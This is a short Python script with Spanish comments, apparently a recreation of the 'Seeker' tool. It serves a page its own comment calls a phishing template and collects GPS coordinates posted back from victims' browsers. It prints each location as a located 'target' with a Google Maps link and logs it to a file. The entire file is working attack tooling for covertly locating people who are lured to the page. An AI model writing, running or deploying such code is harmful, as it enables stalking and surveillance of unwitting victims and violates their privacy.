#!/usr/bin/env python3
import http.server
import socketserver
import json

PORT = 8080

class SeekerHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Sirve la plantilla de phishing que crearemos abajo
        if self.path == '/' or self.path == '/index.html':
            self.path = 'index.html'
        return super().do_GET()

    def do_POST(self):
        if self.path == '/log':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            try:
                datos = json.loads(post_data)
                lat = datos.get('lat')
                lon = datos.get('lon')
                acc = datos.get('acc', 'N/A')
                
                # Formatear el resultado estilo auditoría
                resultado = (
                    f"\n[+] ¡OBJETIVO LOCALIZADO!\n"
                    f"[-] Latitud: {lat}\n"
                    f"[-] Longitud: {lon}\n"
                    f"[-] Precisión: {acc}m\n"
                    f"[-] Google Maps: https://www.google.com/maps/place/{lat},{lon}\n"
                )
                print(resultado)
                
                # Guardar los datos en un reporte físico
                with open("coordenadas.txt", "a") as f:
                    f.write(resultado)
                
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'{"status":"success"}')
            except Exception as e:
                print(f"Error procesando datos: {e}")

if __name__ == "__main__":
    print(f"[*] Servidor Seeker activo en el puerto {PORT}...")
    try:
        with socketserver.TCPServer(("", PORT), SeekerHandler) as httpd:
            httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[-] Cerrando servidor Seeker.")
